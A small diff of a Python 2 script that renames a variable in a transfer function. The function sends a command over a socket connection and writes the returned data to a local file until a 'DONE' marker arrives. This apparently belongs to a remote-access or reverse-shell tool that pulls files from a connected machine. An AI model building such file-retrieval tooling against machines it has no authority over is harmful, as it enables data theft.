@@ -8,15 +8,15 @@ def transfer(conn,command):
     conn.send(command)
     f=open('/root/Desktop/testfile.png','wb')
     while True:
-        packets=conn.recv(1024)
-        if 'Unable to find out the file' in packets:
+        packet=conn.recv(1024)
+        if 'Unable to find out the file' in packet:
             print '[-] Unable to find out the file'
             break
-        if packets.endswith('DONE'):
+        if packet.endswith('DONE'):
             print '[+] Transfer Completed'
             f.close()
             break
-        f.write(packets) 
+        f.write(packet) 
 
 def connect():
 
